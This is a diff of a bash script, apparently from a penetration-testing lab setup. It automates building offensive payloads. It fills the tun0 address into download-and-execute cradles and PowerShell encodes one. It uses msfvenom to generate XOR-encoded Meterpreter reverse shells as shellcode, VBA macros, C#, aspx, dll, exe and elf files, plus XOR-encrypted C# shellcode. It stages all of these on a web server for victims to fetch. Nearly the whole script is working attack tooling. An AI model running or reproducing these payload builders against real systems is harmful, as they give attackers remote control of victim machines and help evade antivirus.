@@ -1,39 +1,45 @@
 #!/bin/bash
 
+# Required directories
+sudo mkdir /var/www/html/payloads
+sudo mkdir /var/www/html/shellcode
+
+# Clear if they already exist
 sudo rm /var/www/html/payloads/*
 sudo rm /var/www/html/shellcode/*
 
+# Get IP address of tun0 interface
 ip_address=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
 
-echo "[*] Creating download execute cradle..."
+echo "[+] Creating download execute cradle..."
 placeholder_cradle="./placeholders/placeholder_cradle.txt"
 new_cradle="/var/www/html/payloads/cradle.txt"
 sed "s/PLACEHOLDER/$ip_address/g" "$placeholder_cradle" > "$new_cradle"
 echo "[+] cradle.txt created!"
 echo ""
 
-echo "[*] Encoding cradle.txt..."
+echo "[+] Encoding cradle.txt..."
 echo "powershell -e $(cat /var/www/html/payloads/cradle.txt | iconv -t utf16le | base64 -w 0)" >> /var/www/html/payloads/cradle.b64
 echo "[+] cradle.b64 created!"
 echo ""
 
-echo "[*] Creating meterpreter binary shellcode..."
+echo "[+] Creating meterpreter binary shellcode..."
 msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw -o /var/www/html/shellcode/met_https_443_x64.bin
 echo ""
 
-echo "[*] Creating meterpreter ps1 shellcode..."
+echo "[+] Creating meterpreter ps1 shellcode..."
 msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f ps1 -o /var/www/html/shellcode/met_https_443_x64.ps1
 echo ""
 
-echo "[*] Creating meterpreter VBA shellcode..."
+echo "[+] Creating meterpreter VBA shellcode..."
 msfvenom --encoder x64/xor_dynamic --platform windows --arch x86 --payload windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication -o /var/www/html/shellcode/met_https_443_x86.vba
 echo ""
 
-echo "[*] Creating meterpreter csharp shellcode..."
+echo "[+] Creating meterpreter csharp shellcode..."
 msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp -o /var/www/html/shellcode/met_https_443_x64.csharp
 echo ""
 
-echo "[*] Creating meterpreter encrypted csharp shellcode..."
+echo "[+] Creating meterpreter encrypted csharp shellcode..."
 inputFile="/var/www/html/shellcode/met_https_443_x64.bin"
 outputFile="/var/www/html/shellcode/enc_met_https_443_x64.csharp"
 key=0x77
@@ -64,23 +70,23 @@ echo "};" >> "$outputFile"
 echo "[+] Saved as: $outputFile"
 echo ""
 
-echo "[*] Creating meterpreter aspx payload..."
+echo "[+] Creating meterpreter aspx payload..."
 msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f aspx -o /var/www/html/payloads/met_https_443_x64.aspx
 echo ""
 
-echo "[*] Creating meterpreter dll payload..."
+echo "[+] Creating meterpreter dll payload..."
 msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f dll -o /var/www/html/payloads/met_https_443_x64.dll
 echo ""
 
-echo "[*] Creating meterpreter exe payload..."
+echo "[+] Creating meterpreter exe payload..."
 msfvenom --encoder x64/xor_dynamic --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f exe -o /var/www/html/payloads/met_https_443_x64.exe
 echo ""
 
-echo "[*] Ceating meterpreter elf payload..."
+echo "[+] Ceating meterpreter elf payload..."
 msfvenom --platform linux --arch x64 --payload linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread --encoder x64/xor_dynamic prependfork=true -f elf -o /var/www/html/payloads/met_tcp_443_x64.elf
 echo ""
 
-echo "[*] Creating meterpreter powershell runners..."
+echo "[+] Creating meterpreter powershell runners..."
 placeholder_run="./placeholders/placeholder_run.txt"
 placeholder_run_at="./placeholders/placeholder_run_at.txt"
 new_runner="/var/www/html/payloads/run.txt"
@@ -95,14 +101,14 @@ echo "[+] run.txt created!"
 echo "[+] run_at.txt created!"
 echo ""
 
-echo "[*] Creating meterpreter powershell loader..."
+echo "[+] Creating meterpreter powershell loader..."
 placeholder_load="./placeholders/placeholder_load.txt"
 new_loader="/var/www/html/payloads/load.txt"
 sed "s/PLACEHOLDER/$ip_address/g" "$placeholder_load" > "$new_loader"
 echo "[+] load.txt created!"
 echo ""
 
-echo "[*] Creating meterpreter VBA runner..."
+echo "[+] Creating meterpreter VBA runner..."
 placeholder_vba_run="./placeholders/placeholder_vba_run.txt"
 new_vba_runner="/var/www/html/payloads/run.vba"
 vba_shellcode="/var/www/html/shellcode/met_https_443_x86.vba"
@@ -114,14 +120,14 @@ rm /tmp/vba_before.txt /tmp/vba_after.txt
 echo "[+] run.vba created!"
 echo ""
 
-echo "[*] Creating meterpreter VBA loader..."
+echo "[+] Creating meterpreter VBA loader..."
 placeholder_vba_load="./placeholders/placeholder_vba_load.txt"
 new_vba_loader="/var/www/html/payloads/load.vba"
 sed "s/PLACEHOLDER/$ip_address/g" "$placeholder_vba_load" > "$new_vba_loader"
 echo "[+] load.vba created!"
 echo ""
 
-echo "[*] Creating meterpreter C# runner..."
+echo "[+] Creating meterpreter C# runner..."
 placeholder_cs_run="./placeholders/placeholder_run.cs"
 new_cs_runner="/var/www/html/payloads/run.cs"
 cs_shellcode="/var/www/html/shellcode/met_https_443_x64.csharp"
